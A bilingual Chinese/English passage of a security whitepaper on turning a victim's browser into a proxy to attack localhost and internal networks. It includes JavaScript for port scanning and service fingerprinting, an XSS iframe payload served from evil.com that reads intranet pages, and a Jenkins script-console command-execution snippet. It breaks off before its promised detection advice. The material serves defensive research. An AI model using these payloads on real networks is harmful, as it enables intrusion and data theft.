# 使用浏览器作为代理从公网攻击内网

## 介绍

At Forcepoint we continually seek to improve the protection our products provide. To this end, we often investigate unusual or potentially novel attack techniques. One such recent topic of research has been attacks against localhost and the internal network, launched from the public Internet.

Though not a new attack, it is not widely known outside of the security research community that a malicious JavaScript can attack the internal network. Of the limited documentation that exists on this topic, most resources describe it in terms of inter-protocol exploitation \[1\] \[2\], whereas our focus is on intra-protocol exploitation. We are not aware of any one-stop resource describing these attacks in terms of intra-protocol attacks, and gathering these techniques in a whitepaper is an attempt to fill a void regarding documentation of these attacks, as well as to bring attention to an underrated attack surface.

Since a browser will by default have access to localhost as well as the local LAN, these attacks can bypass a potential local host-based firewall as well as the corporate/consumer perimeter firewall.

Malicious actors are aware of these attacks, but defenders need to be informed as well. In addition to describing the technical details of the attacks, we will discuss means of detecting and protecting against them.

在 Forcepoint，我们不断寻求改善我们产品所提供的保护。为此，我们经常研究不寻常或潜在新颖的攻击技术。最近的一个研究课题是针对 localhost 和内部网络的攻击，这些攻击是从公网发起的。

虽然不是新的攻击，但在安全研究社区之外，恶意 JavaScript 可以攻击内网并不广为人知。在关于该主题的有限文档中，大多数资源是从 inter-protol(协议到协议)利用来描述[1 \] \ [2 \]，而我们的重点是 intra-protol(协议内部)利用。我们发现没有一站式资源从协议内部攻击的角度去描述这种攻击，并且在白皮书中收集这些技术是为了填补关于这些攻击文档的空白，以及让被低估的攻击面受到关注。

由于浏览器默认可以访问 localhost 以及本地局域网，因此这些攻击可以绕过潜在的本地基于主机的防火墙以及企业/消费者外围防火墙。

恶意攻击者了解这些攻击，但防守者也需要被告知。除了描述攻击的技术细节之外，我们还将讨论检测和防范攻击的方法。

## 可疑行为：公网到局域网的连接

JavaScript loaded from a malicious site can connect to services running on the user’s local computer (localhost) or on other internal hosts in many circumstances. Modern web browsers do not completely prevent attacking the internal network using a victim browser as a proxy. In fact, not only can we have the victim browser send requests internally, but we can also discover internal hosts, do limited port scanning, do service fingerprinting and finally we may even be able to compromise vulnerable services via a malicious JavaScript.

It should be considered suspicious behavior if a web page fetched from the public Internet attempts to access a non-routable IP address, such as localhost or the internal network. Through our telemetry we have not seen benign web pages that reside on the public Internet that would have a valid need for connecting to a private IP address, nor have we been able to identify any valid and reasonable business use-case for doing such a thing. It is questionable whether it should be necessary to allow connections to private IP addresses from web pages that are located on the public Internet other than potentially in some edge cases. One edge case may be the uncommon setup of using public IP addresses on the internal network. (The opposite direction must be allowed though, since many internal pages may fetch external resources for perfectly valid reasons.)

This suspicious behavior, together with individual parts of the attack chain, have certain characteristics that can be modeled for detection purposes. We will later return to a more detailed discussion of detection, as detection makes more sense if we first go through the technical details of the attack chain.

When doing threat modeling, developers typically assume that local services can never receive external input, and as a result, security auditing of these services is often lacking. A recent example of a vulnerable local service that could be attacked via a remotely hosted malicious JavaScript is the Logitech Options application that opens a vulnerable WebSocket server \[3\]. Local attacks via a remote cross-origin JavaScript represent an underrated attack surface.

从恶意站点加载的 JavaScript 可以在许多情况下连接到用户本地计算机（localhost）或其他内部主机上运行的服务。现代 Web 浏览器不能完全阻止使用受害者浏览器作为代理攻击内部网络。事实上，我们不仅可以让受害者浏览器在内部发送请求，而且我们还可以发现内部主机，进行有限端口扫描，进行服务指纹识别，最后我们甚至可以通过恶意 JavaScript 来破坏易受攻击的服务。

如果从公网获取的网页尝试访问未路由的 IP 地址（例如 localhost 或内部网络），则应将其视为可疑行为。通过我们的遥测技术，我们还没有发现过存在于公网上的良性网页需要连接到私有 IP 地址，我们也没有发现任何有效和合理的业务用例来做这样的事情。是否有必要允许公网上的网页连接到私有 IP 地址，而不是在某些边缘情况下，这是值得怀疑的。一个边缘情况可能是在内部网络上使用公共 IP 地址的不常见设置。（但必须允许相反的方向的情况，因为许多内部页面可能出于完全正当的原因而获取外部资源。）

这种可疑行为与攻击链的各个部分一起具有某些特征，可以为检测目的建模。我们稍后将回到更详细的关于检测的讨论，因为如果我们先了解攻击链的技术细节，检测就更有意义了。

在进行威胁建模时，开发者通常认为本地服务永远不会接收外部输入，因此通常缺乏对这些服务的安全审核。可能通过远程托管的恶意 JavaScript 攻击的易受攻击的本地服务的最新示例是 Logitech Option s应用开启易受攻击的 WebSocket 服务器 \[3\]。通过远程跨域 JavaScript 进行的本地攻击代表了一种被低估的攻击面。


### 同源策略不会阻止本地攻击吗？

Indeed, the Same-origin Policy (SOP) \[4] does prevent this attack in many cases, but as we will see, there are still circumstances where an attack may succeed. Though documented, it is a largely overlooked fact that SOP does not prevent the browser from sending out a cross-domain request, it only prevents JavaScript from reading the response. (SOP allows embedding of cross-domain resources such as images and JavaScript,but that is a separate thing.) For attacking certain vulnerable services, it may be enough to be able to blindly send a malicious request in order to satisfy the goals of the attacker.

Mozilla’s documentation describes the functioning of SOP well: cross-origin embedding and writing is allowed, but reading is disallowed. The fact that cross-origin writes are allowed, makes it possible to perform the following attack:

实际上，同源策略（SOP）\[4\]在很多情况下确实可以防范这种攻击，但正如我们看到的，仍然存在攻击可能成功的情况。尽管有相关文档，通常被忽略的事实是同源策略并不会阻止浏览器发出跨域请求，它只能阻止 JavaScript 读取响应。（同源策略允许嵌入跨域资源，如图像和 JavaScript，但这是一个单独的东西。）对于攻击某些易受攻击的服务，它可能足以能够盲目地发送恶意请求以达到攻击者的目的。

Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和写入，但不允许读取。允许跨域写入的事实使得可能执行以下攻击：

1. Victim surfs to a malicious page on the public Internet. JavaScript on this page makes an XMLHttpRequest to an internal server it should not be able to communicate with according to SOP.
2. The browser will nevertheless send the request (at this point the server is exploited).
3. The browser receives the response but will not pass it back to the JavaScript

1. 受害者在互联网上浏览恶意页面。页面上的 JavaScript 根据同源策略向不应与之通信的内部服务器发出异步请求(XMLHttpRequest)。
2. 然而，浏览器将发送请求（此时服务器被利用）。
3. 浏览器收到响应但不会将其传递给 JavaScript。

### 那跨域资源共享呢？

The attacks we are going to show are not related to Cross-origin Resource Sharing (CORS) \[5\], only to SOP. Throughout this whitepaper, we can assume that CORS requests are not allowed, meaning we have the most restrictive setting, where SOP ‘blocks’ everything. Even in the face of SOP, we can carry out our attacks.

我们要展示的攻击与跨域资源共享(CORS) \[5\] 无关，只与同源策略相关。在本白皮书中，我们可以假设不允许跨域资源共享请求，这意味着我们拥有最严格的设置，其中同源策略“阻止”所有内容。即使面对同源策略，我们也可以进行攻击。


## 攻击概述

We will look at examples of how a JavaScript sitting on an external site can attack vulnerable services running on localhost or the internal network, using the victim’s browser as a proxy. As an overview, we will look at the following steps:

我们将看一下使用受害者的浏览器作为代理，外部站点上的 JavaScript 如何攻击运行在 localhost 或内部网络上的易受攻击的服务的示例。作为概述，我们将看看以下步骤：

1. Reconnaissance circumventing SOP: finding out private IP address of victim, finding internal hosts, finding open ports, finding out what services run on the open ports.
2. Edge case of actually surfing the internal network from the outside, using the victim’s browser as a proxy, all while SOP is in effect.
3. Compromising a fingerprinted service running on localhost, giving the attacker persistent access to the victim’s computer.

1. 侦察规避同源策略的方法：查找受害者的私有 IP 地址，查找内部主机，查找开放端口，查找在开放端口上运行的服务。
2. 从外部浏览内部网络的实际边缘情况是使用受害者的浏览器作为代理，同时同源策略生效。
3. 对在 localhost 上运行的识别的服务进行攻击，使攻击者能够持久访问受害者的计算机。

Throughout the years, different attacks have been devised for defeating SOP, for example DNS rebinding \[6\]. In this paper, however, our focus will be with inferring information from JavaScript errors when doing reconnaissance, and with Cross-site Request Forgery (CSRF) when doing exploitation. (This whitepaper does not intend to explain the basics of CSRF attacks, for that we refer the reader to other sources, such as OWASP \[7\].) 

There exist some prerequisites for compromising an internal service:

近年来，已经设计出不同的攻击来对抗同源策略，例如 DNS 重新绑定 \[6\]。然而，在本文中，我们的重点将是在进行侦察时以及通过跨站点请求伪造(CSRF)利用时从 JavaScript 错误中推断信息。（本白皮书并不打算解释 CSRF 攻击的基础知识，我们将推荐其它资源给读者，例如 OWASP \ [7 \]。）

攻击内部服务存在一些先决条件：

* The service needs to reside on localhost or on the internal network and be accessible by the victim (for example the local LAN or corporate network via VPN).
* The port and either of IP address or hostname of the service needs to be known, or possible to figure out.
* The service needs to be vulnerable to CSRF (predictable transaction parameters).
* If the service requires authentication, the victim must currently be logged on.

* 服务需要驻留在 localhost 或内部网络上，并且可由受害者（例如本地局域网或企业网络通过 VPN）访问。
* 需要知道端口以及服务的 IP 地址或主机名，或者可以弄清楚。
* 该服务需要易受CSRF（可预测的交易参数）的攻击。
* 如果服务需要身份验证，则受害者当前必须已经登录。

While the reconnaissance part employs quite general techniques, exploitation via CSRF will be targeted to a specific application or device. Therefore, for non-targeted attacks, the best bet for the attacker is to attack some commonly installed application or, for example, a home router. Many home routers have had CSRF vulnerabilities, are rarely up-to-date on patching, and they typically use a known, static IP address – properties that make them easy to target. Examples of vulnerable home routers can be found online \[8\].

虽然侦察部分采用了相当普遍的技术，但通过 CSRF 的攻击将针对特定的应用程序或设备。因此，对于没有特定目标的攻击，攻击者的最佳选择是攻击一些常用的应用程序，或者家庭路由器。许多家用路由器都有 CSRF 漏洞，很少及时更新补丁，而且它们通常使用已知的静态 IP 地址 - 这些属性使它们易于定位。易受攻击的家庭路由器的例子可以在网上找到 \[8\]。

### 潜在的类似攻击

For brevity, we will limit ourselves to showing the attacks mentioned above, but we would also have numerous other opportunities to attack, such as:

为简洁起见，我们近阐述上述攻击，但我们还有许多其他攻击机会，例如：

* Changing the admin password of the victim’s router via CSRF, or changing the router configuration.
* Sending email via the internal SMTP mail server with Inter-protocol exploitation. (Would require an extra step of installing a malicious browser extension in order to disable blacklisting of the SMTP port.)
* Compromising vulnerable devices (e.g. printers) within the organization.
* Blind SQL-injection cross-domain by using a timing side-channel attack (leaking page loading times).
* In case the TOR browser is configured insecurely, allowing communication with the local LAN, that could potentially be used for de-anonymizing the user. A CSRF attack could be done against the TOR user’s router, making it ping some external host, and thereby revealing the public IP address.

* 通过 CSRF 更改受害者路由器的管理员密码，或更改路由器配置。
* 通过具有协议间漏洞的内部 SMTP 邮件服务器发送电子邮件。（需要额外的步骤来安装恶意浏览器扩展以禁用 SMTP 端口的黑名单。）
* 攻击组织内的易受攻击的设备（例如打印机）。
* 使用定时侧通道攻击（泄漏页面加载时间）进行盲跨域 SQL 注入。
* 如果 TOR 浏览器配置不安全，则允许与本地局域网通信，这可能会用于对用户进行去匿名化。可以对 TOR 用户的路由器进行 CSRF 攻击，使其对某些外部主机执行 ping 操作，从而显示公共 IP 地址。

### 协议间的漏洞

Worth noting is that, due to inter-protocol exploitation \[9] \[10] \[11\], the attack opportunities are not necessarily limited to services speaking HTTP/HTTPS. Since different vendors sometimes interpret RFC’s differently, protocols often forgive mistakes. Sending an HTTP POST request to a different protocol may lead the other service to just ignore the HTTP headers that it does not understand, and  only act on the payload.

In addition to running perfectly legal commands on the service speaking a different protocol, the service could be exploited to get arbitrary code execution (e.g. via a buffer overflow), should a suitable vulnerability exist. While modern browsers are less vulnerable to inter-protocol exploitation than older browsers, due to modern browsers blacklisting access to many common ports \[12] of other protocols by default, many ports are still allowed. Also, with a malicious browser extension the attacker can disable blacklisting of any port. An example of a device that could potentially be attacked with inter-protocol exploitation is the WIFICAM web camera \[13] that has a vulnerable telnet service with a weak, static password (exploitation via a browser requires a port blacklisting bypass).

值得注意的是，由于协议间利用 \[9\] \[10\] \[11\]，攻击机会不一定限于 HTTP/HTTPS 服务。由于不同的供应商有时会以不同的方式解释 RFC，因此协议通常会忽略错误。将 HTTP POST 请求发送到不同的协议可能会导致其他服务忽略它不理解的 HTTP 头，并且只对有效负载起作用。

除了在讲述不同协议的服务上运行完全合法的命令之外，如果存在合适的漏洞，则可以利用该服务来获得任意代码执行（例如，通过缓存溢出）。虽然现代浏览器比旧版浏览器更不容易受到协议间漏洞的影响，但由于现代浏览器默认将其他协议的许多常见端口 \[12 ] 列入黑名单，但仍允许使用很多端口。此外，通过恶意浏览器扩展，攻击者可以禁用任何端口的黑名单。可能受到协议间漏洞攻击的设备的一个例子是WIFICAM 网络摄像机 \[13\]，它具有易受攻击的 telnet 服务以及弱静态密码（通过浏览器绕过黑名单端口绕过来利用）。

## 侦察

In order to exploit something, we first need to do reconnaissance to find out what is is vulnerable on the target. Let’s look at how that can be done while working around SOP.

为了利用某些东西，我们首先需要进行侦察来找出目标上易受攻击的目标。让我们看看如何解决同源策略相关问题。

### 找到受害者的内部 IP 地址

The victim’s own machine will always reply to the IP address 127.0.0.1, and that is useful for us. In addition to that, it is beneficial to know what IP address the victim’s machine uses when communicating on the internal network. The reason for that is that knowing the internal IP address will allow us to make much more targeted searches for other hosts nearby.

A JavaScript can find out the internal IP address of the victim using the WebRTC API. A proof of concept for that can be found at Ipcalf [14\]. It does not work with all combinations of browsers and platforms, but this is what it looks like when run in Chrome on Linux:

受害者的机器将始终回复 IP 地址 127.0.0.1，这对我们很有用。除此之外，了解受害者的机器在内部网络上进行通信时使用的 IP 地址是有益的。原因是知道内部 IP 地址将允许我们对附近的其他主机进行更有针对性的搜索。

JavaScript 可以使用 WebRTC API 找出受害者的内部 IP 地址。 可以在 Ipcalf \[14\] 找到对此的概念证明。它不适用于浏览器和平台的所有组合，但这是在 Linux上 中运行 Chrome 时的样子：

![A4hg6e.png](https://s2.ax1x.com/2019/04/08/A4hg6e.png)

**图例 1**: 使用 JavaScript 显示内部 IP 地址

A malicious JavaScript implementing this technique may send information about the internal IP address back to the attacker.

通过恶意 JavaScript 实现的这种技术可能会将有关内部 IP 地址的信息发送给攻击者。

### 基于内网实现对其他主机有根据的猜测

Before finding open ports and potentially vulnerable services, we need to find out what hosts exist on the internal network. For that purpose, we will next make educated guesses at internal IP addresses and hostnames. That actually works quite well even for non-targeted attacks. *Note that in this stage we are just guessing these IP addresses and hostnames; later we will go through how we can technically verify whether our guesses are correct*.

Some common default address ranges for both consumer and low-end corporate network devices such as ADSL modems and routers are 192.168.0.0/24, 192.168.1.0/24 and 192.168.8.0/24. It is very likely that a user, whether at home or on a small corporate network, is located on one of those subnets.

Additionally, many low-end DHCP servers assign IP addresses starting from octet .100 by default, so an educated guess is that we may well find other internal hosts at addresses 192.168.0.100-105, and similar for the other subnets listed above.

Larger corporations are usually on the 172.16.0.0/24 or the 10.0.0.0/24 subnet, which both have such a large IP address space that simply guessing the correct C-net might not be fruitful. Fortunately for the attacker, the above mentioned way of using JavaScript to expose the internal IP address of the victim will reveal the correct C-net. Whatever the last octet of the address may be in the corporate environment, looking at nearby octets may be a good choice for the attacker.

Routers typically use the lowest IP address in the subnet by default. For example on the 192.168.1.0/24 subnet, it is a very reasonable assumption that the router has the IP address 192.168.1.1.

Furthermore, we do not even have to know the IP address, we can also guess plausible hostnames, such as http://bugzilla.targetorg.com, or http://wiki.targetorg.com. Other potential hostnames may be for example intranet…, mail…, printer…, jenkins…, git…, etc. These names will be resolved to IP addresses by the victim’s browser, using the target organization’s internal DNS server.

Yet another option for finding out internal hosts is to obtain intelligence about internal services by other means. Most commonly seen in targeted attacks, the attacker may be able to find information by means such as dumpster diving, social engineering, get assistance from a rogue employee, web page information leak, etc.

在找到开放端口和可能易受攻击的服务之前，我们需要找出内网中存活的主机。为此，我们接下来将对内部 IP 地址和主机名进行有根据的猜测。这对于即使非特定目标的攻击也非常有效。 *请注意，在这个阶段我们只是猜测这些 IP 地址和主机名;稍后我们将通过技术验证我们的猜测是否正确*。

消费者和低端企业网络设备（如 ADSL 调制解调器和路由器）的一些常见默认地址范围是 192.168.0.0/24,192.168.1.0/24 和 192.168.8.0/24。无论是在家庭还是在小型企业网络上，用户很可能位于其中一个子网中。

此外，许多低端 DHCP 服务器默认分配从八位字节开始的 IP 地址，因此有一个有根据的猜测是，我们可能会在地址 192.168.0.100-105 找到其他内部主机，对于上面列出的子网也是类似的。

较大的公司通常使用 172.16.0.0/24 或 10.0.0.0/24 作为子网网段，它们都有如此大的 IP 地址空间，只是猜测正确的C-net可能不会有成效。对于攻击者来说幸运的是，上面提到的使用JavaScript公开受害者内部IP地址的方式将揭示正确的C-net。无论地址的最后八位字节可能在公司环境中，查看附近的八位字节对于攻击者来说可能是一个不错的选择。

默认情况下，路由器通常使用子网中最低的IP地址。例如，在192.168.1.0/24子网上，路由器的IP地址为192.168.1.1是一个非常合理的假设。

此外，我们甚至不必知道IP地址，我们也可以猜出合理的主机名，例如http://bugzilla.targetorg.com或http://wiki.targetorg.com。其他潜在的主机名可能是例如intranet ...，mail ...，printer ...，jenkins ......，git ......等。这些名称将由受害者的浏览器使用目标组织的内部DNS服务器解析为IP地址。

查找内部主机的另一个选择是通过其他方式获取有关内部服务的情报。在目标攻击中最常见的是，攻击者可以通过诸如垃圾箱潜水，社会工程，获得流氓员工的帮助，网页信息泄露等手段来查找信息。

### 通过端口扫描验证主机是否存在

At this stage of our attack, we have a list of plausible IP addresses, including localhost, as well as some reasonable guesses of potential hostnames. Our next step will be to verify which of our guesses were correct. Verification will be done by portscanning those hosts. Remember, we are not interested in the hosts per se, rather we are interested in whatever open ports and running services they may have.

SOP will prevent any JavaScript that we make from reading the response if attempting to connect with HTTP to these hosts, so checking if a specific port is open by directly connecting to it will not work.

However, there is still a way to infer whether a port is open or not. Our JavaScript can attempt to load an image from the HTTP port of the host that we want to verify the existence for. If the onerror or onload event fires, then the port may be open, and if we get a timeout, then the port is closed.

Naturally, this is not a good substitute for a real port scanner. It can actually only differentiate between the following two cases \[15\]:

在攻击阶段，我们有一个合理的 IP 地址列表，包括 localhost，以及一些合理的潜在主机名。我们的下一步将是验证我们的哪些猜测是正确的。验证将通过端口扫描这些主机来完成。请记住，我们对主机本身不感兴趣，而是对它们可能拥有的任何开放端口和运行服务感兴趣。

如果尝试使用 HTTP 连接到这些主机，同源策略会阻止任意可以读取响应的 JavaScript ，因此通过直接连接到特定端口来检查它否打开将不起作用。

但是，仍有一种方法可以推断出端口是否开放。我们可以通过 JavaScript 尝试从主机的端口加载图片来验证端口是否开放。如果 onerror 或 onload 事件触发，则端口可能是打开的，如果超时，则端口是关闭的。

当然，这不是真正的端口扫描器的良好替代品。它实际上只能区分以下两种情况\ [15 \]：

1.	The port is open or closed in a way that makes it respond immediately with a reset packet.
2.	The port is closed and the connection attempt is dropped, or the host does not exist.

1. 端口打开或关闭并因此可以立即响应重置数据包。
2. 端口关闭，尝试的连接被丢弃，或主机不存在。

This means that we may get some false positives. Ports marked as open may or may not be open. Ports marked as closed may be either closed or the host does not exist – either way they are not interesting for our purposes.

Due to browsers blacklisting many common non-HTTP ports by default, the most interesting ports to scan are typically normal HTTP ports such as 80, 443 and 8080. Also, potentially interesting are some non-blocked ports where we sometimes find more specialized services. An example of that may be the CUPS printing service on port 631. For highly targeted attacks we may have some other specific port in focus.

Knowing the local IP address and filling it out with educated guesses of hosts, we can make a malicious page that portscans these hosts, similar to some open-source tools available \[16\]. The HTML file with our embedded port scanning JavaScript is placed on some other domain, which will be a publicly available server in the general case.

Our HTML looks like this (only snippet shown for brevity):

这意味着我们可能会得到一些误报。标记为开放的端口可能是打开的，也可能未打开。标记为已关闭的端口可能已关闭或主机不存在 - 无论哪种方式，这都不是我们所感兴趣的。

由于浏览器默认将许多常见的非 HTTP 端口列入黑名单，因此最有趣的扫描端口通常是普通的 HTTP 端口，例如 80,443 和 8080。此外，一些未屏蔽的端口可能很有用，我们有时会找到更特定的服务。其中一个例子可能是 631 端口上的 CUPS 打印服务。对于高度针对性的攻击，我们可能会关注其他一些特定端口。

知道本地 IP 地址并通过主机的有根据的猜测，我们可以创建一个扫描端口主机的恶意页面，类似于一些可用的开源工具 \[16\]。将嵌入端口扫描的 JavaScript 的 HTML 文件放在其他域上，在一般情况下，这将是一个公共服务器。

我们的HTML看起来像这样（简介起见仅显示代码段）：

```html
<html>
<head>
<script src="check_open_ports.js" type="text/javascript"></script>
</head>
<body onload="portscan()">
<table>
<tr>
<th>host:port</th>
<th>status</th>
</tr>
<tr>
<td id="host1name">127.0.0.1:80</td>
<td id="host1result">?</td>
</tr>
 
[snip]
 

<tr>
<td id="host12name">intranet.targetorg.com:80</td>
<td id="host12result">?</td>
</tr>
 
</table>
</body>
</html>
```

The JavaScript file check_open_ports.js looks like this:

```javascript
function scan(resultElem,hostport,serviceName,uriPath) 
    { var image = new Image();
    image.onerror = function() 
        { if (!image) {
            return;
        }
        image = undefined;
        if (resultElem.textContext == '?')
            { resultElem.textContent = serviceName + 
            "open";
        }
    };
    image.onload = image.onerror;
if (hostport.split(":")[1] == 443) {
    image.src = 'https://' + hostport + uriPath;
} else {
    image.src = 'http://' + hostport + uriPath;
}
setTimeout(function()
    { if (!image) {
        return;
    }
    image = undefined;
    if (resultElem.textContext == '?') 
        { resultElem.textContent = serviceName + 
        "closed";
    }
  },2000);
}

function portscan() 
    { var i = 1;
    hostport = document.getElementById("host" + i + "name").textContent; while (hostport) {
        resultElem = document.getElementById("host" + i + "result"); 
        scan(resultElem,hostport,"","");
        i++;
        hostport = document.getElementById("host" + i + "name").textContent;
    }
}
```

When the victim surfs to the page we get:

当受害者访问这个页面是，我们将获得：

![A4W87q.png](https://s2.ax1x.com/2019/04/08/A4W87q.png)

**图例 2**: 使用 JavaScript 端口扫描的结果

The domain targetorg.com exists in our lab network, and DNS lookups of those names were done in the victim’s browser, using the target’s internal DNS server. For attacking a different organization, we could substitute ‘targetorg.com’ with the applicable domain, or else we could simply try e.g. ‘printer’, without any domain name, and have the victim’s DNS resolver add the correct domain name automatically.

We can easily modify the proof-of-concept to have the results sent back to us (the code for this is not shown), and we can do some analysis of the results. We now know that the host wiki.targetorg.com is not interesting, since its HTTP port is either closed or the host does not exist. The ports marked as open may be interesting, so for those ports we can do some fingerprinting, leading us to the next stage of the attack…

域targetorg.com存在于我们的实验室网络中，这些名称的DNS查找是在受害者的浏览器中使用目标的内部DNS服务器完成的。 对于攻击其他组织，我们可以将“targetorg.com”替换为适用的域名，否则我们可以尝试例如 'printer'，没有任何域名，让受害者的DNS解析器自动添加正确的域名。

我们可以轻松地修改概念验证以将结果发回给我们（未显示此代码），我们可以对结果进行一些分析。 我们现在知道主机wiki.targetorg.com并不感兴趣，因为它的HTTP端口已关闭或主机不存在。 标记为打开的端口可能很有趣，因此对于这些端口，我们可以做一些指纹识别，引导我们进入下一阶段的攻击......

> Note: A resource worth mentioning is the LocalNetworkScanner project. It retrieves the local IP address and then port scans the local C-net as well as the surrounding C-nets. The project’s source code is on Github \[17\], and there is a live version as well \[18\]. With some browsers it can correctly find many internal hosts, but the milage varies with different browsers.

### Finding out what services run on open ports by using default files

At this point we have a slightly trimmed list of (potentially) open ports, since we were able to remove one host/port from our original list of educated guesses for hosts/ports. Our next step is to find out what services run on these ports.

Once again, SOP makes us very blind, but finding out what service runs behind a port can be done by using a technique similar to how we did portscanning. An added twist will be to try to find specific image files. If the onload event fires, we know that the corresponding image file exists on the server (though our JavaScript cannot access it). If instead the onerror event fires, the sought for image does not exist. So, even though the JavaScript cannot read from the page due to SOP, it can still determine the difference.

For fingerprinting, let’s take advantage of our ability to determine whether a specific image exists or not. Different web applications typically have their own set of default files. For example, if the file http://xx.xx.xx.xx /images/jenkins.png exists, the service in question is likely a Jenkins build server.
Likewise, finding a file named /images/cups-postscript-chain.png in the web root, is an indication that we may be dealing with a CUPS printing service. Using inference as before, we can check whether a specific file exists on some remote server.

When performing this fingerprinting, we would want to have as large a list of default files in different web applications as possible, since the larger list we have, the more successful the fingerprinting will be. On the Internet we may find ready-made lists of default files to look for when doing fingerprinting \[19] \[20\].

In the previous section, we verified which guessed hosts actually exist. For purposes of fingerprinting, let’s use the same HTML/JavaScript as previously, but modifying it in two ways:

1.	Remove ports known to be closed.
2.	Add checks for default files of some known services.

The scan() function in our JavaScript is modified slightly so that it differentiates between onload and onerror:
 
```javascript 
image.onerror = function() 
    { if (!image) {
        return;
    }
    image = undefined;
    // Make sure we don't overwrite the service if some other check
    // already found out what the service is. 
    if (resultElem.textContent == '?') {
        resultElem.textContent = "-";
    }
};
image.onload = function() 
    { if (!image) {
        return;
    }
    image = undefined; 
    resultElem.textContent = serviceName;
};
```

The portscan() function in our JavaScript then tests for different running services like this: 

```
scan(resultElem,hostport,'apache','/icons/apache_pb.png'); scan(resultElem,hostport,'cups','/images/cups-postscript-chain.png'); scan(resultElem,hostport,'lexmark printer','/images/lexlogo.gif'); scan(resultElem,hostport,'cisco router','/themes/img/speciel/ciscobg.jpg'); scan(resultElem,hostport,'seagate','/assets/img/Logo_Seagate_White.png'); scan(resultElem,hostport,'jenkins','/images/jenkins.png');
```

When the victim surfs to our malicious page, the result is:

![A4WL8S.png](https://s2.ax1x.com/2019/04/08/A4WL8S.png)

Figure 3: fingerprinting of services on localhost and on the local LAN
 
Once again, the results will be sent back to the attacker. The hosts printer.targetorg.com and 192.168.1.102 might be the same host, since both appear to be Lexmark printers according to the fingerprinting. Potentially, intranet.targetorg.com and 192.168.1.100 are the same host.

> Note: a successful service fingerprinting is a final verification that a port is indeed open. For port 127.0.0.1:80, we still do not know for sure whether the port is closed, or if it is open but the service fingerprinting failed. For host 192.168.1.103 we still do not know for sure whether it exists or not. For the ports where fingerprinting was successful, we have a quite firm assurance that the ports are indeed open and we know what services are behind them.

Now, let’s take a step back and see what we have accomplished so far. In face of SOP, and starting from the public Internet, we have successfully been able to fingerprint what services run on nine hosts on the internal network, including localhost. This concludes the reconnaissance part of our attack.

> Note: for instructional purposes we have used multiple malicious web pages when performing our reconnaissance. In practice, a real attacker would likely want to prepare a malicious page that performs all of these steps in a single page, only requiring a single click by the victim.

## Surfing the internal network via XSS and changed page origin

So far, we have talked about how SOP only allows us to send requests, but not read responses. As a side-step, let’s look at an edge case where we can actually read responses as well, even where full SOP is in force – that is, no CORS that loosens the restrictions imposed by SOP. The ability to read responses will essentially let us surf the victim’s internal network from the outside, using the victim’s browser as a proxy.

SOP does not prevent reading from pages within the same origin, and a page may change its own origin in order to be able to talk to a subdomain \[21\]. For example, if http://targetorg.com has been configured to be able to talk to http://intranet.targetorg.com, then we can do the same as an attacker if we are able to run JavaScript code at targetorg.com. A Cross-site Scripting (XSS) vulnerability at http://targetorg.com may allow this scenario.

In the lab environment used for our setup, we have the DNS entry targetorg.com pointing to a public IP address, thus, it’s available for the attacker (that is, for us) to experiment with. The attacker discovers an XSS vulnerability on the website at http://targetorg.com:
 
![A4WxDs.png](https://s2.ax1x.com/2019/04/08/A4WxDs.png)

Figure 4: XSS at http://targetorg.com

In the source code of the HTML we have:

```html
<html>
<head>
<title>Public web page for Targetorg</title>
<script>
document.domain = "targetorg.com";
</script>
```

The 'document.domain' definition is interesting. Let’s inject some JavaScript that will surf the intranet.targetorg.com site that we discovered in the reconnaissance phase. Let’s inject the following JavaScript:

```javascript
var iframe = document.createElement('iframe'); 
iframe.src = 'http://intranet.targetorg.com'; 
iframe.onload = function(e) {
    alert('Sending contents of intranet.targetorg.com to attacker: ' + iframe.contentWindow.document.documentElement.outerHTML);
};
document.body.appendChild(iframe);
```

On our public malicious server evil.com, we will make an iframe that loads http://targetorg.com using the above injection. The result is that the web page of http://evil.com will have two nested iframes: one that shows http://targetorg.com, and that one in turn has an iframe that shows http://intranet.targetorg.com. The JavaScript that we place in the web page of http://evil.com/malicious.html is therefore:

```javascript
var theiframe = document.createElement('iframe'); theiframe.src =
'http://targetorg.com/?inject=var%20iframe%20%3d%20document.createElement(%27 iframe%27);%20iframe.src%20%3d%20%27http://intranet.targetorg.com%27;%20iframe.onload%20%3d%20function(e)%20%7b%20alert(%27Sending%20contents%20of%20intra net.targetorg.com%20to%20attacker:%20%27%20+%20iframe.contentWindow.document. documentElement.outerHTML);%20%7d;%20document.body.appendChild(iframe);'; 
document.body.appendChild(theiframe);
```

When the victim surfs to our malicious URL the result is:

![A4fl8O.png](https://s2.ax1x.com/2019/04/08/A4fl8O.png)

Figure 5: surfing the intranet of the victim via a JavaScript on a public server.

The screenshot in Figure 5 shows that the JavaScript can indeed access the contents of the intranet, and not just display it in an iframe. Thus, it can also send it back to the attacker. What happens is that the outer iframe runs within the origin of targetorg.com, and can access the data of the inner iframe coming from intranet.targetorg.com. Essentially, this allows us to surf the internal network of the victim, viewing their intranet web pages.

> Note: A requirement for this attack to work is that both the targetorg.com and the intranet.target.org pages have defined ‘document.domain = “targetorg.com”’, placing them in the same origin as far as SOP is concerned.

Another possible attack scenario could be if the victim has a password server at passwords.targetorg.com. Then we might be able to read passwords if the victim is logged on to the password server while surfing to our malicious HTML/JavaScript page.
 

## Compromising Jenkins running on localhost

After the side-step of showing how to surf the intranet of targetorg.com, let’s return to our mission of compromising some internal service from the public Internet.

### Playing with our own Jenkins instance

From the reconnaissance we did earlier, we have clear indications that there is a Jenkins instance running at http://127.0.0.1:8080. As an attacker, we can setup our own Jenkins instance and do some experimentation in order to prepare for the attack. Jenkins has a script console that can be used for executing scripts and even operating system commands:

![A4f3xe.png](https://s2.ax1x.com/2019/04/08/A4f3xe.png)

Figure 6: Jenkins script console

For executing operating system commands, we can enter the following in the script console and then click Run \[22]:

```
def sout = new StringBuffer(), serr = new StringBuffer() 
def proc = '<SOME_COMMAND>'.execute()
proc.consumeProcessOutput(sout, serr) 
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

### Choosing the attack

As an attacker, we can make a malicious JavaScript that submits the form shown above. Note that due to SOP, this JavaScript will not be able to read the response. However, the OS command will still be executed, and that is enough to compromise the service. Shortly, we will look at how to verify command execution despite not being able to read the response.
 
Depending on the configuration, authentication might or might not be required to access the script console. Even if authentication is required, we can still access the script console via CSRF, as long as the user is currently logged on to Jenkins. The reason is that the browser will add any authentication cookies to our request (if we set ‘request.withCredentials = true;’) – the attacker does not need to know them. What matters is whether Jenkins is configured with CSRF protection or not.

